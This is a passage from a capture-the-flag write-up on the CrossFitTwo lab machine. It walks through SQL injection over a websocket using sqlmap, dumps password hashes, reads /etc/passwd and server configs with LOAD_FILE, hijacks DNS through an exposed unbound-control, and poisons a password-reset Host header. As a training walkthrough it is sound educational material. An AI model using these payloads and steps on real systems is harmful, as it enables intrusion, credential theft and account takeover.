This will wait for a web request to `/`, and then initiate the websocket connection. It will read the token, and then get the `params` parameter from the request. Now it will send the injection over the websocket with the valid token and the `params` set to the request parameter input, and return the debug part (where the injection is). I’ll load the string to an Python object using `json.loads`, and then pull the `debug` part to return.

Now I’ll run `sqlmap` through it. I’ll use a couple flags:
- Some of the requests `sqlmap` will try to send will just generate no response from the server. `--timeout 3` will just give up after three seconds.
- By default, `sqlmap` will assume a timeout is a failure somewhere else and try again. Adding `--ignore-timeouts` will have it treat this as a failure and move on, which is appropriate here.
- Because I know from manual tests that UNION injection works, I’ll just have it do that with `--technique=U`.
- `--batch` will just choose the default answers for any mid-exploitation prompts that come up.

It works:

```

oxdf@parrot$ sqlmap -u http://127.0.0.1:5000/?params=1 --timeout 1 --ignore-timeouts --technique=U --batch
...[snip]...
sqlmap identified the following injection point(s) with a total of 20 HTTP(s) requests:
---
Parameter: params (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: params=-6430 UNION ALL SELECT NULL,CONCAT(CONCAT('qpkxq','SrOjExfySLoPEhBWAdtuAgpEhBtKXFJUcLqNbCgr'),'qpxjq')-- mBxQ
---
[20:15:41] [INFO] testing MySQL
[20:15:41] [INFO] confirming MySQL
[20:15:41] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
...[snip]...

```

It’s not surprising that it found the injection. But now I can do normal enumeration, like list the DBs by adding `--dbs`:

```

oxdf@parrot$ sqlmap -u http://127.0.0.1:5000/?params=1 --timeout 1 --ignore-timeouts --technique=U -p params --batch --dbs
...[snip]...
[20:17:15] [INFO] fetching database names
available databases [3]:
[*] crossfit
[*] employees
[*] information_schema
...[snip]...

```

Replacing `--dbs` with `--tables`, it’ll dump all the tables:

```

oxdf@parrot$ sqlmap -u http://127.0.0.1:5000/?params=1 --timeout 1 --ignore-timeouts --technique=U -p params --batch --tables                                                              ...[snip]...
[20:18:57] [INFO] fetching database names
[20:18:57] [INFO] fetching tables for databases: 'crossfit, employees, information_schema'
Database: information_schema
[80 tables]
+---------------------------------------+
| ALL_PLUGINS                           |
| APPLICABLE_ROLES                      |
...[snip]...
| user_variables                        |
+---------------------------------------+

Database: crossfit
[1 table]
+---------------------------------------+
| membership_plans                      |
+---------------------------------------+

Database: employees
[2 tables]
+---------------------------------------+
| employees                             |
| password_reset                        |
+---------------------------------------+

```

### SQLi Enumeration

#### Tables

With two methods to enumerate the database, I’ll look around at what’s there. The `membership_plans` table has the plans I found earlier (`-D crossfit -T membership_plans --dump`):

```

Database: crossfit
Table: membership_plans
[4 entries]
+----+----------+-----------+------------+---------------+
| id | name     | available | base_price | current_price |
+----+----------+-----------+------------+---------------+
| 1  | 1-month  | 1         | 99.99      | 99.99         |
| 2  | 3-months | 1         | 129.99     | 129.99        |
| 3  | 6-months | 0         | 209.99     | 189.99        |
| 4  | 1-year   | 1         | 899.99     | 859.99        |
+----+----------+-----------+------------+---------------+

```

Switching to the `employees` database, the `employees` table has four entries (`-D employees -T employees --dump`):

```

Database: employees
Table: employees
[4 entries]
+----+-----------------------------+------------------------------------------------------------------+---------------+
| id | email                       | password                                                         | username      |
+----+-----------------------------+------------------------------------------------------------------+---------------+
| 1  | david.palmer@crossfit.htb   | fff34363f4d15e958f0fb9a7c2e7cc550a5672321d54b5712cd6e4fa17cd2ac8 | administrator |
| 2  | will.smith@crossfit.htb     | 06b4daca29092671e44ef8fad8ee38783b4294d9305853027d1b48029eac0683 | wsmith        |
| 3  | maria.williams@crossfit.htb | fe46198cb29909e5dd9f61af986ca8d6b4b875337261bdaa5204f29582462a9c | mwilliams     |
| 4  | jack.parker@crossfit.htb    | 4de9923aba6554d148dbcd3369ff7c6e71841286e5106a69e250f779770b3648 | jparker       |
+----+-----------------------------+------------------------------------------------------------------+---------------+

```

The `password_reset` table returns empty (`-D employees -T password_reset --dump`):

```

[08:08:06] [INFO] fetching columns for table 'password_reset' in database 'employees'
[08:08:06] [INFO] fetching entries for table 'password_reset' in database 'employees'
[08:08:06] [WARNING] unable to retrieve the entries for table 'password_reset' in database 'employees'

```

#### Password Reset

Earlier, I found a login page and a password reset form, but I was unable to use it because I didn’t have any valid email addresses. If I enter one from the `employees` table above, it returns:

![image-20210707081233959](https://0xdfimages.gitlab.io/img/image-20210707081233959.png)

Now that’s in the DB as well:

```
+---------------------------+------------------------------------------------------------------+---------------------+
| email                     | token                                                            | expires             |
+---------------------------+------------------------------------------------------------------+---------------------+
| david.palmer@crossfit.htb | 9f1d6826985f0179ed38afd3d65b54a640659c9dc519174c08c66f65419f73b6 | 2021-07-04 13:18:24 |
+---------------------------+------------------------------------------------------------------+---------------------+

```

Earlier `feroxbuster` only found `index.php` and `password-reset.php`. I can guess that perhaps the link in the user’s email is to `password-reset.php` perhaps with the `token` as a parameter, which would look like `http://employees.crossfit.htb/password-reset.php?token=9f1d6826985f0179ed38afd3d65b54a640659c9dc519174c08c66f65419f73b6`. Unfortunately, it returns:

![image-20210707083044129](https://0xdfimages.gitlab.io/img/image-20210707083044129.png)

That does imply that I guessed the format of the link correctly. Changing the parameter name from `token` to something else just returns no message, which I suspect is because the script is checking for the existence of `token`. My best guess at this point is that the DB holds a hash of the token.

#### Privs

Another thing to check with `sqlmap` is the current user’s privileges with `--privileges`:

```

database management system users privileges:
[*] 'crossfit_user'@'localhost' [1]:
    privilege: FILE

```

I could also see this manually:

```

injection> 3 union select group_concat(privilege_type),2 from information_schema.user_privileges
[id: FILE, name: 2]

```

`FILE` [gives the following](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file):

> ​ Affects the following operations and server behaviors:
>
> - ​ Enables reading and writing files on the server host using
>   the [`LOAD DATA`](https://dev.mysql.com/doc/refman/5.7/en/load-data.html) and [`SELECT ... INTO OUTFILE`](https://dev.mysql.com/doc/refman/5.7/en/select-into.html) statements and the
>   [`LOAD_FILE()`](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function. A user who has the [`FILE privilege can read
>   any file on the server host that is either world-readable or readable
>   by the MySQL server. (This implies the user can read any file in any
>   database directory, because the server can access any of those files.)
> - ​ Enables creating new files in any directory where the MySQL
>   server has write access. This includes the server’s data directory
>   containing the files that implement the privilege tables.
> - ​ As of MySQL 5.7.17, enables use of the `DATA DIRECTORY`
>   or `INDEX DIRECTORY` table option for the [`CREATE TABLE`](https://dev.mysql.com/doc/refman/5.7/en/create-table.html) statement.
>
> As a security measure, the server does not overwrite exsting files.

MySQL can read files using the `LOAD_FILE()` function. It works:

```

injection> 3 union select load_file('/etc/passwd'),2 from information_schema.user_privileges
[id: root:*:0:0:Charlie &:/root:/bin/ksh
daemon:*:1:1:The devil himself:/root:/sbin/nologin
operator:*:2:5:System &:/operator:/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin
build:*:21:21:base and xenocara build:/var/empty:/bin/ksh
sshd:*:27:27:sshd privsep:/var/empty:/sbin/nologin
_portmap:*:28:28:portmap:/var/empty:/sbin/nologin
_identd:*:29:29:identd:/var/empty:/sbin/nologin
_rstatd:*:30:30:rpc.rstatd:/var/empty:/sbin/nologin
_rusersd:*:32:32:rpc.rusersd:/var/empty:/sbin/nologin
_fingerd:*:33:33:fingerd:/var/empty:/sbin/nologin
_x11:*:35:35:X Server:/var/empty:/sbin/nologin
_unwind:*:48:48:Unwind Daemon:/var/empty:/sbin/nologin
_switchd:*:49:49:Switch Daemon:/var/empty:/sbin/nologin
_traceroute:*:50:50:traceroute privdrop user:/var/empty:/sbin/nologin
_ping:*:51:51:ping privdrop user:/var/empty:/sbin/nologin
_unbound:*:53:53:Unbound Daemon:/var/unbound:/sbin/nologin
_dpb:*:54:54:dpb privsep:/var/empty:/sbin/nologin
_pbuild:*:55:55:dpb build user:/nonexistent:/sbin/nologin
_pfetch:*:56:56:dpb fetch user:/nonexistent:/sbin/nologin
_pkgfetch:*:57:57:pkg fetch user:/nonexistent:/sbin/nologin
_pkguntar:*:58:58:pkg untar user:/nonexistent:/sbin/nologin
_spamd:*:62:62:Spam Daemon:/var/empty:/sbin/nologin
www:*:67:67:HTTP Server:/var/www:/sbin/nologin
_isakmpd:*:68:68:isakmpd privsep:/var/empty:/sbin/nologin
_rpki-client:*:70:70:rpki-client user:/nonexistent:/sbin/nologin
_syslogd:*:73:73:Syslog Daemon:/var/empty:/sbin/nologin
_pflogd:*:74:74:pflogd privsep:/var/empty:/sbin/nologin
_bgpd:*:75:75:BGP Daemon:/var/empty:/sbin/nologin
_tcpdump:*:76:76:tcpdump privsep:/var/empty:/sbin/nologin
_dhcp:*:77:77:DHCP programs:/var/empty:/sbin/nologin
_mopd:*:78:78:MOP Daemon:/var/empty:/sbin/nologin
_tftpd:*:79:79:TFTP Daemon:/var/empty:/sbin/nologin
_rbootd:*:80:80:rbootd Daemon:/var/empty:/sbin/nologin
_ppp:*:82:82:PPP utilities:/var/empty:/sbin/nologin
_ntp:*:83:83:NTP Daemon:/var/empty:/sbin/nologin
_ftp:*:84:84:FTP Daemon:/var/empty:/sbin/nologin
_ospfd:*:85:85:OSPF Daemon:/var/empty:/sbin/nologin
_hostapd:*:86:86:HostAP Daemon:/var/empty:/sbin/nologin
_dvmrpd:*:87:87:DVMRP Daemon:/var/empty:/sbin/nologin
_ripd:*:88:88:RIP Daemon:/var/empty:/sbin/nologin
_relayd:*:89:89:Relay Daemon:/var/empty:/sbin/nologin
_ospf6d:*:90:90:OSPF6 Daemon:/var/empty:/sbin/nologin
_snmpd:*:91:91:SNMP Daemon:/var/empty:/sbin/nologin
_ypldap:*:93:93:YP to LDAP Daemon:/var/empty:/sbin/nologin
_rad:*:94:94:IPv6 Router Advertisement Daemon:/var/empty:/sbin/nologin
_smtpd:*:95:95:SMTP Daemon:/var/empty:/sbin/nologin
_rwalld:*:96:96:rpc.rwalld:/var/empty:/sbin/nologin
_nsd:*:97:97:NSD Daemon:/var/empty:/sbin/nologin
_ldpd:*:98:98:LDP Daemon:/var/empty:/sbin/nologin
_sndio:*:99:99:sndio privsep:/var/empty:/sbin/nologin
_ldapd:*:100:100:LDAP Daemon:/var/empty:/sbin/nologin
_iked:*:101:101:IKEv2 Daemon:/var/empty:/sbin/nologin
_iscsid:*:102:102:iSCSI Daemon:/var/empty:/sbin/nologin
_smtpq:*:103:103:SMTP Daemon:/var/empty:/sbin/nologin
_file:*:104:104:file privsep:/var/empty:/sbin/nologin
_radiusd:*:105:105:RADIUS Daemon:/var/empty:/sbin/nologin
_eigrpd:*:106:106:EIGRP Daemon:/var/empty:/sbin/nologin
_vmd:*:107:107:VM Daemon:/var/empty:/sbin/nologin
_tftp_proxy:*:108:108:tftp proxy daemon:/nonexistent:/sbin/nologin
_ftp_proxy:*:109:109:ftp proxy daemon:/nonexistent:/sbin/nologin
_sndiop:*:110:110:sndio privileged user:/var/empty:/sbin/nologin
_syspatch:*:112:112:syspatch unprivileged user:/var/empty:/sbin/nologin
_slaacd:*:115:115:SLAAC Daemon:/var/empty:/sbin/nologin
nobody:*:32767:32767:Unprivileged user:/nonexistent:/sbin/nologin
_mysql:*:502:502:MySQL Account:/nonexistent:/sbin/nologin
lucille:*:1002:1002:,,,:/home/lucille:/bin/csh
node:*:1003:1003::/home/node:/bin/ksh
_dbus:*:572:572:dbus user:/nonexistent:/sbin/nologin
_redis:*:686:686:redis account:/var/redis:/sbin/nologin
david:*:1004:1004:,,,:/home/david:/bin/csh
john:*:1005:1005::/home/john:/bin/csh
ftp:*:1006:1006:FTP:/home/ftp:/sbin/nologin
, name: 2]

```

I’ll add a `read` command to my Python shell:

```

    def do_read(self, args):
        if len(args) == 0:
            print("[-] Usage: read [filename]")
            return
        results = self.send_connected(f"3 union select load_file('{args}'),2 from information_schema.user_privileges")
        print(results[5:-10])

```

`sqlmap` will also read files using `--file-read=/etc/passwd`, but it saves it to a file which I then have to open, which is a minor pain.

### Hashcat Failures

I spent some time with `hashcat` trying to break both the token and the passwords for the accounts dumped from the database. Both looks like SHA256 hashes, but no wordlists I tried returns anything.

## Access to Chat

### Filesystem Enumeration

#### unbound

I tried to read the Unbound config file, but failed:

```

injection> read /etc/unbound/unbound.conf
null

```

On OpenBSD, it’s actually at `/var/unbound/etc/unbound.conf` according to [the docs](https://man.openbsd.org/unbound.conf). That worked:

```

injection> read /var/unbound/etc/unbound.conf
server:
        interface: 127.0.0.1
        interface: ::1
        access-control: 0.0.0.0/0 refuse
        access-control: 127.0.0.0/8 allow
        access-control: ::0/0 refuse
        access-control: ::1 allow
        hide-identity: yes
        hide-version: yes
        msg-cache-size: 0
        rrset-cache-size: 0
        cache-max-ttl: 0
        cache-max-negative-ttl: 0
        auto-trust-anchor-file: "/var/unbound/db/root.key"
        val-log-level: 2
        aggressive-nsec: yes
        include: "/var/unbound/etc/conf.d/local_zones.conf"

remote-control:
        control-enable: yes
        control-interface: 0.0.0.0
        control-use-cert: yes
        server-key-file: "/var/unbound/etc/tls/unbound_server.key"
        server-cert-file: "/var/unbound/etc/tls/unbound_server.pem"
        control-key-file: "/var/unbound/etc/tls/unbound_control.key"
        control-cert-file: "/var/unbound/etc/tls/unbound_control.pem"

```

Control is enabled on all interfaces, and it’s using certs. I’ll read `unbound_server.pem`, `unbound_control.key` and `unbound_control.pem`, and save them in `/etc/unbound` on the local VM. Now I can connect to Unbound:

```

oxdf@parrot$ sudo unbound-control -s 10.10.10.232 status
version: 1.11.0
verbosity: 1
threads: 1
modules: 2 [ validator iterator ]
uptime: 21 seconds
options: control(ssl)
unbound (pid 44818) is running...

```

I played with a bunch of other commands on the [man page](https://www.nlnetlabs.nl/documentation/unbound/unbound-control/), but didn’t find much useful. Many of the commands didn’t exist (`view_local_zone`, `auth_zone_transfer`, `list_auth_zone`, etc). I can’t set up individual domains, but it looks like I can add a forward for a zone:

```

oxdf@parrot$ sudo unbound-control -s 10.10.10.232 forward_add +i employees.crossfit.htb 10.10.14.13@53
ok

```

I really wish I had a good way to test if this was actually leading to DNS resolutions, but I couldn’t come up with one. I don’t have a plan for this yet, but it will prove useful later.

#### httpd

I took some guesses at where the PHP source might be, but came up empty. For example:

```

injection> read /var/www/html/index.php
null

```

The [OpenBSD httpd config file](https://man.openbsd.org/httpd.conf.5) should be at `/etc/httpd.conf`:

```

injection> read /etc/httpd.conf
# $OpenBSD: httpd.conf,v 1.20 2018/06/13 15:08:24 reyk Exp $

types {
    include "/usr/share/misc/mime.types"
}

server "0.0.0.0" {
        no log
        listen on lo0 port 8000

        root "/htdocs"
        directory index index.php

        location "*.php*" {
                fastcgi socket "/run/php-fpm.sock"
        }
}

server "employees" {
        no log
        listen on lo0 port 8001

        root "/htdocs_employees"
        directory index index.php

        location "*.php*" {
                fastcgi socket "/run/php-fpm.sock"
        }
}

server "chat" {
        no log
        listen on lo0 port 8002

        root "/htdocs_chat"
        directory index index.html

        location match "^/home$" {
            request rewrite "/index.html"
        }
        location match "^/login$" {
            request rewrite "/index.html"
        }
        location match "^/chat$" {
            request rewrite "/index.html"
        }
        location match "^/favicon.ico$" {
            request rewrite "/images/cross.png"
        }
}

```

Interestingly, it lays out three servers:

|  | Interface | Port | WebRoot |
| --- | --- | --- | --- |
| 0.0.0.0 | lo0 | 8000 | `/htdocs` |
| employees | lo0 | 8001 | `/htdocs_employees` |
| chat | lo0 | 8002 | `/htdocs_chat` |

All the servers are listening on localhost, so something else must be proxying requests to port 80 over to these ports. I assumed at this point that `chat` was the websockets, but I’ll see later it’s not.

#### relayd

Googling for “openbsd reverse proxy”, all the results come back talking about `relayd`:

![image-20210707111542427](https://0xdfimages.gitlab.io/img/image-20210707111542427.png)

The first [stackexchange link](https://unix.stackexchange.com/questions/387422/openbsd-relayd-ssl-reverse-proxy-for-3-web-servers) even has ASCII art that looks like the setup on CrossFitTwo:

![image-20210707111633627](https://0xdfimages.gitlab.io/img/image-20210707111633627.png)

The config file confirms this setup:

```

injection> read /etc/relayd.conf
table<1>{127.0.0.1}
table<2>{127.0.0.1}
table<3>{127.0.0.1}
table<4>{127.0.0.1}
http protocol web{
        pass request quick header "Host" value "*crossfit-club.htb" forward to <3>
        pass request quick header "Host" value "*employees.crossfit.htb" forward to <2>
        match request path "/*" forward to <1>
        match request path "/ws*" forward to <4>
        http websockets
}

table<5>{127.0.0.1}
table<6>{127.0.0.1 127.0.0.2 127.0.0.3 127.0.0.4}
http protocol portal{
        pass request quick path "/" forward to <5>
        pass request quick path "/index.html" forward to <5>
        pass request quick path "/home" forward to <5>
        pass request quick path "/login" forward to <5>
        pass request quick path "/chat" forward to <5>
        pass request quick path "/js/*" forward to <5>
        pass request quick path "/css/*" forward to <5>
        pass request quick path "/fonts/*" forward to <5>
        pass request quick path "/images/*" forward to <5>
        pass request quick path "/favicon.ico" forward to <5>
        pass forward to <6>
        http websockets
}

relay web{
        listen on "0.0.0.0" port 80
        protocol web
        forward to <1> port 8000
        forward to <2> port 8001
        forward to <3> port 9999
        forward to <4> port 4419
}

relay portal{
        listen on 127.0.0.1 port 9999
        protocol portal
        forward to <5> port 8002
        forward to <6> port 5000 mode source-hash
}

```

That’s kind of hard to make sense of, but it helps to start with `relay web`:

```

relay web{
        listen on "0.0.0.0" port 80
        protocol web
        forward to <1> port 8000
        forward to <2> port 8001
        forward to <3> port 9999
        forward to <4> port 4419
}

```

It’s listening on 80, and then references `protocol web`, which is defined above:

```

http protocol web{
        pass request quick header "Host" value "*crossfit-club.htb" forward to <3>
        pass request quick header "Host" value "*employees.crossfit.htb" forward to <2>
        match request path "/*" forward to <1>
        match request path "/ws*" forward to <4>
        http websockets
}

```

If the hostname is `*employees.crossfit.htb`, it will `forward to <2>`. `<2>` is defined as `table<2>{127.0.0.1}`, and back in the `relay` block, `forward to <2> port 8001` indicates the port. `*employees.crossfit.htb` will go to localhost:8001, which fits with the `employees` vhost defined in the `httpd` config.

I created a diagram at this point to show what I know and don’t know:

[![image-20210709145915919](https://0xdfimages.gitlab.io/img/image-20210709145915919.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210709145915919.png)

Two things that are worth noting:
1. There’s a new host here, `*crossfit-club.htb`, which forwards to localhost:9999, which is another `relayd`, called `portal`.
2. The host-based filtering starts with a `*`, so it will match on anything ending with the hostname, including other subdomains. For example, if I update `/etc/hosts` to include `0xdfemployees.crossfit.htb`, and then visit it, I get the same page as `employees.crossfit.htb`.

### crossfit-club.htb

#### Site

I’ll update `/etc/hosts` to now include `crossfit-club.htb` and then visit. It’s another login portal:

![image-20210709150827365](https://0xdfimages.gitlab.io/img/image-20210709150827365.png)

Attempting to sign in just produces a failure message:

![image-20210709151130007](https://0xdfimages.gitlab.io/img/image-20210709151130007.png)

The link to SIGN UP leads to a page with a disabled form:

![image-20210709151204452](https://0xdfimages.gitlab.io/img/image-20210709151204452.png)

Viewing the button in the Firefox dev tools shows that it’s disabled:

![image-20210709151300398](https://0xdfimages.gitlab.io/img/image-20210709151300398.png)

I’ll edit it to remove the class `v-btn--disabled` and `disabled="disabled"`, and now the button looks active:

![image-20210709151358574](https://0xdfimages.gitlab.io/img/image-20210709151358574.png)

Still, clicking on the button doesn’t generate any network traffic.

The `<form>` element in the HTML shows the following inputs: `username`, `email`, `password`, and `confirm`. I’ll note these for later.

#### Tech Stack

When I try to login, there is network traffic generated. Looking in Burp, the request looks like:

```

POST /api/login HTTP/1.1
Host: crossfit-club.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
X-CSRF-Token: pvxuXAcH-CFm-mWD225HZm0VkiddLplYEjFU
Content-Length: 39
Origin: http://crossfit-club.htb
DNT: 1
Connection: close
Referer: http://crossfit-club.htb/login
Cookie: connect.sid=s%3AEBMDt6BkIH1cpocRUwmChQ8Spj6KrWLU.v8ALELpPlb%2FIgnEkurTBWzaxPAlxMkYufoKBdXoLepk

{"username":"admin","password":"admin"}

```

The parameters are submitted as JSON, along with the `Content-Type: application/json` header. There’s a CSRF token in the `X-CSRF-TOKEN` header.

The response:

```

HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: http://crossfit-club.htb
Connection: close
Content-Length: 19
Content-Type: application/json; charset=utf-8
Date: Fri, 09 Jul 2021 19:23:16 GMT
ETag: W/"13-HDUUERS3rKfQcrn8nujpi6q3Oho"
Vary: Origin
X-Powered-By: Express

{"success":"false"}

```

The headers show it is Express, a NodeJS frame work that runs on 5000 by default (so that matches what I noted in the diagram above).

#### API Endpoints

Given the POST to `/api/login`, it seems like a good idea to look at that API, as perhaps the sign up endpoints are active there, even if the page doesn’t send.

Burp shows the requests to the different JavaScript files requested on loading this page:

![image-20210709152535447](https://0xdfimages.gitlab.io/img/image-20210709152535447.png)

There’s a ton starting with `chunk-vendors~`, but also one that starts with `app~`. Using `curl`, `grep`, and `sort` I’ll isolate unique references to `/api`:

```

oxdf@parrot$ curl -s crossfit-club.htb/js/app~748942c6.ead68abe.js | grep -oE '/api/[^"]*' | sort -u
/api/auth
/api/gridy/${e[t].username}.svg`,new:!1,unreadCount:0,roomName:e[t].username,users:[]};a.users.push(this.getCurrentUser()),a.users.push(e[t]),this.rooms.push(a)}},sendGlobal:function(e,t){const a={sender_id:xe.id,content:e,roomId:t};xe.emit(
/api/gridy/${name}.svg`,items:[{title:
/api/login

```

Throwing the JavaScript into [beautifier.io](https://beautifier.io) shows where these are used. The two for `/api/gridy` are to another site. The other two are interesting. `/api/auth`:

![image-20210709153149587](https://0xdfimages.gitlab.io/img/image-20210709153149587.png)

`/api/login`:

![image-20210709153405063](https://0xdfimages.gitlab.io/img/image-20210709153405063.png)

The code is still obscure, but there are both GET and POST requests, as well as data for the POST to `/api/login`.

Replicating these with `curl`, `/api/auth` returns a token:

```

oxdf@parrot$ curl -s crossfit-club.htb/api/auth
{"success":"false","token":"RRwT59ke-dlR0-0ixAlMCo4JDXf73VfcveLQ"}

```

I observed `/api/login` above.

Shifting focus a bit, I want to fuzz for more endpoints. I find that subdomains can be good approximations for parameters, so I’ll try that kind of wordlist, and it finds more:

```

oxdf@parrot$ wfuzz -u http://crossfit-club.htb/api/FUZZ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hc 404
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://crossfit-club.htb/api/FUZZ
Total requests: 19983

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000291:   200        0 L      1 W        66 Ch       "auth"
000001191:   200        0 L      3 W        71 Ch       "ping"

Total time: 63.34692
Processed Requests: 19983
Filtered Requests: 19981
Requests/sec.: 315.4533

```

I’ll also try with POST requests, which finds different endpoints:

```

oxdf@parrot$ wfuzz -X POST -u http://crossfit-club.htb/api/FUZZ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hc 404
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://crossfit-club.htb/api/FUZZ
Total requests: 19983

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000110:   200        0 L      3 W        50 Ch       "login"
000000769:   200        0 L      3 W        50 Ch       "signup"

Total time: 53.34050
Processed Requests: 19983
Filtered Requests: 19981
Requests/sec.: 374.6308

```

`signup` is what I was looking for. A POST request without data returns:

```

oxdf@parrot$ curl -s -X POST crossfit-club.htb/api/signup
{"success":"false","message":"Invalid CSRF Token"}

```

When I observed the POST to `/api/login` above, the CSRF token was passed in the `X-CSRF-TOKEN` header, which can be fetched from `/api/auth`. I could also verify that with an OPTIONS request that shows it accepts a `X-CSRF-TOKEN` header:

```

oxdf@parrot$ curl -v -X OPTIONS crossfit-club.htb/api/signup
*   Trying 10.10.10.232:80...
* Connected to crossfit-club.htb (10.10.10.232) port 80 (#0)
> OPTIONS /api/signup HTTP/1.1
> Host: crossfit-club.htb
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 204 No Content
< Access-Control-Allow-Credentials: true
< Access-Control-Allow-Headers: X-CSRF-TOKEN,Content-Type
< Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
< Connection: close
< Content-Length: 0
< Date: Fri, 09 Jul 2021 20:02:07 GMT
< Vary: Origin
< X-Powered-By: Express
< 
* Closing connection 0

```

Typically, this token is associated with a cookie between requests, and `/api/auth` is setting a cookie:

```

oxdf@parrot$ curl -vs http://crossfit-club.htb/api/auth
*   Trying 10.10.10.232:80...
* Connected to crossfit-club.htb (10.10.10.232) port 80 (#0)
> GET /api/auth HTTP/1.1
> Host: crossfit-club.htb
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Access-Control-Allow-Credentials: true
< Connection: keep-alive
< Content-Length: 66
< Content-Type: application/json; charset=utf-8
< Date: Fri, 09 Jul 2021 20:05:14 GMT
< ETag: W/"42-QVTx8ttga9k5gEKrue7Obv1IpVI"
< Set-Cookie: connect.sid=s%3AQJGHwN6aTFMw3hoKL7lvLegGxagp8peF.ZNmKI5sdmzwvtU4lscA6RJjN%2Fprb03IoCeRhcXdVrGM; Path=/; Expires=Sat, 09 Jul 2022 20:05:14 GMT; HttpOnly
< Vary: Origin
< X-Powered-By: Express
< 
* Connection #0 to host crossfit-club.htb left intact
{"success":"false","token":"J4jvv6z0-pwMkLhdsKuhV5DJzk1pNdJBUNrE"}

```

I’ll use `curl` and the `-c` to save cookies to a file, and then `-b` to read from that file.

```

oxdf@parrot$ TOKEN=$(curl -c /tmp/c -s http://crossfit-club.htb/api/auth | jq -r '.token');
oxdf@parrot$ curl -s -b /tmp/c -X POST crossfit-club.htb/api/signup -H "X-CSRF-TOKEN: ${TOKEN}"
{"success":"false","message":"Only administrators can register accounts."}

```

I was hoping for an error about which fields were missing, but rather, it’s still not happy with my cookie, as it doesn’t belong to an admin. I’ll come back to this.

### CSRF Registration

#### Overview

I started out thinking I needed to reset the admin’s password, but that ended up not working.

What I’ll need to do is create a user on the `crossfit-club.htb` site. To do that, I need an admin to make the API request. The only way I know of to send an admin a link here is using the password reset link, but presumably, that just sends a link to `employees.crossfit.htb`.

The next step was inspired by [this HackerOne report](https://hackerone.com/reports/281575). Basically, the site wanted the password reset script to be robust against website name changes, so it used the `Host` header to generate the link that gets sent to the user.

I can modify the `Host` header in a password reset request. I’ll need to do it so that `relayd` still routes it to the Employees site. I can use `unbound-control` so that the domain resolves to me, and that will get an admin requesting a page from my host. I can return a page with the JavaScript necessary to make the request to the API to create an account for me. If that works, I’ll have an account and can log in.

#### Initial Password Reset Request

I need a domain name that will route through `relayd` and reach the site on 8001, so it will have to match `*employees.crossfit.htb`. I don’t want to hijack the entire site, but I showed above that something like `0xdf-employees.crossfit.htb` will reach the site on 8001.

I’ll use `unbound-control` to tell CrossfitTwo that I’m the server for that zone (it’s worth noting that this is cleared every few minutes, so worth resending if things stop working):

```

oxdf@parrot$ sudo unbound-control -s 10.10.10.232 forward_add +i 0xdf-employees.crossfit.htb 10.10.14.13@53
ok

```

While I’m still testing to see if this is going to work, I’ll just listen on UDP 53 with `nc` to see if that resolution happens.

I’ll go back and submit a password reset request for david.palmer@crossfit.htb (because his username was administrator) just like above, but catch the request in Burp Proxy and kick it to Repeater. I’ll update the `Host` header to the new domain:

```

POST /password-reset.php HTTP/1.1
Host: 0xdf-employees.crossfit.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://employees.crossfit.htb
DNT: 1
Connection: close
Referer: http://employees.crossfit.htb/password-reset.php
Upgrade-Insecure-Requests: 1

email=david.palmer%40crossfit.htb

```

On sending, there’s a request immediately at `nc`:

```

oxdf@parrot$ nc -uvnlp 53
listening on [any] 53 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.232] 9788
▮│␍°↑␊└⎻┌⎺≤␊␊␌⎼⎺⎽⎽°␋├
├␉)

```

It’s junk, but it there are no other reasons why CrossfitTwo would be connecting to my host on UDP 53. Unfortunately, in the response:

![image-20210710154223669](https://0xdfimages.gitlab.io/img/image-20210710154223669.png)

Given both the error message and the immediacy of the response, it seems clear that the webserver code must be doing a DNS resolution on the host and making sure that the host comes back as 127.0.0.1.

#### Fake DNS Server

Googling for “fake DNS server” led to [this repo](https://github.com/Crypt0s/FakeDns), a good looking DNS server with some useful features. I’ll clone a copy, and create a config file. To start, I just want to resolve 0xdf-employees.crossfit.htb to 127.0.0.1 to get see if that sends the reset link. I’ll start with a simple config to do that:

```

A 0xdf-employees.crossfit.htb 127.0.0.1

```

Now I’ll send the same request, and immediate there’s two hits at the server:

```

oxdf@parrot$ /opt/FakeDns/fakedns.py -c fakedns.conf 
>> Parsed 1 rules from fakedns.conf
>> Matched Request - 0xdf-employees.crossfit.htb.
>> Matched Request - 0xdf-employees.crossfit.htb.

```

Looking in the rendered page, it seems to have worked:

![image-20210710161739046](https://0xdfimages.gitlab.io/img/image-20210710161739046.png)

About 30-45 seconds later, there’s another:

```

>> Matched Request - 0xdf-employees.crossfit.htb.

```

My best guess at this point is that the first two are the server doing validation on the host, and the one after some delay is the user clicking on the link.

#### DNS Rebind

A really cool feature of this DNS server is that it can do DNS rebinding. The README shows this example:

> ```

> A rebind.net 1.1.1.1 10%4.5.6.7
>
> ```

>
